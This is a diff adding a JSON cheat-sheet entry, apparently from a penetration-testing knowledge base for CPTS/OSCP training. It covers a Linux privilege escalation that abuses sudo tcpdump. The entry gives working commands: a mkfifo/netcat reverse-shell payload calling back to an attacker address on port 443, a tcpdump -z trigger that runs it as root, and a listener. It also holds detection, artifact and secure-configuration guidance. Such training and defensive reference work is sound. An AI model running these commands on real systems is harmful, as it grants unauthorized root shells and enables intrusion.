@@ -1,0 +1,116 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "tcpdump",
+    "nc"
+  ],
+  "tags": [
+    "sudo",
+    "tcpdump",
+    "reverse-shell"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Sudo Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Confirm tcpdump is sudo-allowed",
+      "command": "sudo -l"
+    },
+    {
+      "label": "Reverse-shell payload for the postrotate command",
+      "command": "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 443 >/tmp/f' > /tmp/.test"
+    },
+    {
+      "label": "Run tcpdump so -z executes it as root",
+      "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root"
+    },
+    {
+      "label": "Catch the shell",
+      "command": "nc -lnvp 443"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 check AppArmor status (may block sudo escapes)",
+      "command": "sudo aa-status"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 check syslog for AppArmor denials if escape fails",
+      "command": "cat /var/log/syslog | grep tcpdump | grep apparmor"
+    }
+  ],
+  "notes": "tcpdump's -z runs a command on each rotated file as the -Z user (root). -G 1 -W 1 forces one immediate rotation so the payload fires at once. OSCP Ch17: tcpdump sudo escape is blocked by AppArmor on Debian 10. Audit via /var/log/syslog | grep tcpdump -> apparmor='DENIED'. Check aa-status for the active profile list before attempting GTFOBins sudo escapes. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Linux Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sudo-abuse",
+      "note": "The sudo enumeration that surfaces this.",
+      "rel": "prereq"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Payload options for the postrotate command.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "sudo-tcpdump",
+  "name": "Sudo Abuse - tcpdump postrotate Command",
+  "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root",
+  "description": "tcpdump's -z runs a command on each rotated file as root. If you can sudo tcpdump, point -z at a reverse-shell script to get a root shell.",
+  "steps": [
+    {
+      "label": "1. Write the payload script",
+      "command": "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test"
+    },
+    {
+      "label": "2. Start listener (attacker)",
+      "command": "nc -lnvp 443"
+    },
+    {
+      "label": "3. Trigger via tcpdump -z",
+      "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root\n# full path variant: sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1548.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "tcpdump supports a -z (postrotate-command) flag that executes a script after each rotation. When run with sudo, the -z argument calls the attacker's script as root. Combined with -G 1 (rotate every 1 second) and -W 1 (single rotation), tcpdump immediately executes the payload script as root without requiring any network capture to complete.",
+    "prerequisites": "sudo access to /usr/sbin/tcpdump. Attacker can write a payload script. Network interface access.",
+    "impact": "Arbitrary command execution as root via tcpdump's postrotate callback. Reverse shell, sudoers modification, SUID shell creation.",
+    "detection": "tcpdump executed via sudo with -z flag pointing to non-standard script. Unusual payload script in /tmp executed by tcpdump. Auditd: tcpdump spawning unexpected child process as root.",
+    "artifacts": "Sudo log: tcpdump with -z argument | Process tree: tcpdump -> attacker payload script -> reverse shell | Network connection from root process",
+    "prevention": "Use AppArmor or SELinux profile to restrict tcpdump's capabilities even when run with sudo. If tcpdump must be in sudoers, restrict it to specific flags that exclude -z: use sudoers with argument matching. Avoid granting sudo tcpdump entirely -- prefer dedicated monitoring tools.",
+    "misconfiguration": "sudoers grants unrestricted sudo access to /usr/sbin/tcpdump without argument restrictions, allowing -z flag abuse.",
+    "vulnerable_config": "# Vulnerable sudoers\nhtb-student ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump\n\n# Exploit:\n# echo 'bash reverse shell' > /tmp/.test\n# sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root",
+    "secure_config": "# Option 1: Remove tcpdump from sudoers\n# Use dedicated network monitoring solution instead\n\n# Option 2: AppArmor profile to restrict tcpdump even in sudo\n# /etc/apparmor.d/usr.sbin.tcpdump\n# Deny exec of arbitrary files in postrotate\n\n# Option 3: Sudo with command args locked down\nhtb-student ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump -i eth0 -n",
+    "sources": [
+      "HTB M25",
+      "MITRE T1548.003"
+    ]
+  }
+}
